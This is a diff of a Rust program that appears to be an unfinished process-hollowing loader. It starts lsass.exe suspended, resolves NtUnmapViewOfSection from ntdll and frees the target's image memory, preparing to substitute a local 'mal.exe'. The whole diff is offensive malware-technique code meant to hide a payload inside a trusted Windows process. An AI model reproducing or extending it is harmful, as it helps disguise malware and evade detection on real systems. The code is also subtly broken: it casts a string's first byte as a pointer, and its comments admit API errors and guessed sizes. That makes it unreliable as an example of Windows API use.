@@ -31,7 +31,13 @@ use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS, CREATE_NEW_PROCESS
 use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
 use winapi::um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW};
 //use winapi::shared::ntdef::FALSE;
-use winapi::shared::minwindef::{FALSE, DWORD, HINSTANCE__};
+use winapi::shared::minwindef::{FALSE, DWORD, HINSTANCE__, LPVOID};
+use winapi::shared::basetsd::{SIZE_T};
+use winapi::shared::winerror::{HRESULT_FROM_WIN32};
+use winapi::um::memoryapi::{VirtualFreeEx, VirtualAllocEx};
+use winapi::um::errhandlingapi::{GetLastError};
+use winapi::ctypes::c_void;
+
 
 extern crate bytes;
 use bytes::Bytes;
@@ -65,14 +71,26 @@ fn main() {
 	let mut mal_file = File::open("C:\\Users\\Emily\\Documents\\mal\\mal.exe").expect("Error opening file.\n");
 	mal_file.read_to_end(&mut mal_buf).expect("Error reading file contents into buffer.\n");
 	
+	let mal_data = ProcessData{pidh : mal_buf[0], pinh : mal_buf[1]};
+	
+	let mal_pe = PeFile::from_bytes(&mal_buf).unwrap();
+	let dos_head = mal_pe.dos_header();
+	let nt_head = mal_pe.nt_headers();
+	let section_head = mal_pe.section_headers();
+	
+	//Needed for VirtualFreeEx later
+	//let legit_pe = PeFile::from_bytes(&mal_buf).unwrap();
+	//let nt_head = mal_pe.nt_headers();
+	
 	//println!("File:\n{:?}\n", mal_file);
 	//println!("Buf contents:\n{:?}\n", mal_buf);
 	
 	//let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();
 
 	//u16 representations of str needed for calling W (unicode) versions of windows commands
-	let mut legit_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
+	let mut legit_path: Vec<u16> = OsStr::new("C:\\windows\\system32\\lsass.exe").encode_wide().chain(once(0)).collect();
 	let mut mal_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
+	
 	
 	let mut proc_info = PROCESS_INFORMATION {
             hProcess: null_mut(),
@@ -84,58 +102,83 @@ fn main() {
 	let mut startup_info : STARTUPINFOW = unsafe { mem::zeroed() };
 	startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
 	
-	//let mal_proc = unsafe { 
+	
 	let mut mal_proc = unsafe { 
 						CreateProcessW (null_mut(),
-										//legit_path.as_mut_ptr(),
-										mal_path.as_mut_ptr(),
+										legit_path.as_mut_ptr(),
+										//mal_path.as_mut_ptr(),
 										null_mut(), null_mut(), FALSE,
 										//Create thread in suspended state
 										//0x00000004,
 										//0x00000010,
 										CREATE_SUSPENDED,
 										null_mut(), null_mut(),
-										&mut startup_info, &mut proc_info);						
+										&mut startup_info, &mut proc_info)						
 							};
 	
 	let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
 	//legit_proc.popen();
 	
 	
-	let mut mod_handle_str: Vec<u16> = OsStr::new("ntdll.dll").encode_wide().chain(once(0)).collect();
-	//let mut mod_handle_str = OsStr::new("ntdll.dll");
-	
+	//let mut mod_handle_str: Vec<u16> = OsStr::new("ntdll.dll").encode_wide().chain(once(0)).collect();
+	let mut mod_handle_str: Vec<u16> = OsStr::new("C:\\Windows\\System32\\ntdll.dll").encode_wide().chain(once(0)).collect();
 	
 	let mut mod_handle = unsafe {
-	//let mut mod_handle : HINSTANCE__ = unsafe {
-							GetModuleHandleW (mod_handle_str.as_ptr());
+							GetModuleHandleW (mod_handle_str.as_ptr())
 						};
 						
 	//let mal_path_i8 = CString::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").unwrap().as_bytes_with_nul();
 	//let mal_path_c_str = CString::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").unwrap().as_bytes_with_nul();
 	
 	//Forced into this - *const i8 demanded by GetProcAddress
-	//Might want to have a basin nearby before reading
+	//Might want to have a bucket nearby before reading
 	let mal_path_i8 : i8 = unsafe {
-	//						i8::try_from(*mal_path_c_str.as_ptr()).unwrap()
+							//i8::try_from(*mal_path_c_str.as_ptr()).unwrap()
 							i8::try_from(*CString::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").unwrap().as_bytes_with_nul().as_ptr()).unwrap()
 						};
+						
+	let unmap_i8 : i8 = unsafe {
+							//i8::try_from(*mal_path_c_str.as_ptr()).unwrap()
+							i8::try_from(*CString::new("NtUnmapViewOfSection").unwrap().as_bytes_with_nul().as_ptr()).unwrap()
+						};
+						
 	//No W version of GetProcAddress available because the universe is a harsh place
-	
-	
+	//Step 3
 	let mut proc_addr = unsafe {
-							//GetProcAddress (mod_handle, mal_path.as_ptr());
-							GetProcAddress (&mut mod_handle, mal_path_i8 as *const i8);
+							//GetProcAddress (mod_handle, mal_path_i8 as *const i8)
+							GetProcAddress (mod_handle, unmap_i8 as *const i8)
+							
+							/*
+							GetProcAddress (
+							GetModuleHandleW (mod_handle_str.as_ptr()),
+							mal_path_i8 as *const i8
+							)
+							*/
 						};
 	
 	
+	let mut mal_img_base = nt_head.OptionalHeader.ImageBase;
 	
-	let mal_data = ProcessData{pidh : mal_buf[0], pinh : mal_buf[1]};
+	//NtUnmapViewOfSection not available in winapi-rs
+	//Resorting to VirtualFreeEx instead
+	//Parameter incorrect error being thrown here
+	let free_res = unsafe {
+						VirtualFreeEx (
+							proc_info.hProcess,
+							mal_img_base as LPVOID,
+							//1000,
+							//Not correct, but best guess for now
+							nt_head.OptionalHeader.SizeOfImage as SIZE_T,
+							//MEM_RELEASE
+							0x8000
+							)
+					};
 	
-	let mal_pe = PeFile::from_bytes(&mal_buf).unwrap();
-	let dos_head = mal_pe.dos_header();
-	let nt_head = mal_pe.nt_headers();
-	let section_head = mal_pe.section_headers();
+
+	let err = unsafe {
+				GetLastError()
+	};
+
 	
 	println!("PE e_magic:{:?}\n", mal_pe.dos_header().e_magic);
 	
@@ -147,7 +190,15 @@ fn main() {
 	
 	println!("mal_path_i8:\n{:?}\n", mal_path_i8);
 	
-	//println!("mod handle:\n{:?}\n", mod_handle);
+	println!("unmap:\n{:?}\n", unmap_i8);
+	
+	println!("proc_addr:\n{:?}\n", proc_addr);
+	
+	println!("mod handle:\n{:?}\n", mod_handle);
+	
+	println!("free_res:\n{:?}\n", free_res);
+	
+	println!("err:\n{:?}\n", err);
 	
 	thread::sleep(time::Duration::from_millis(10000));
 	
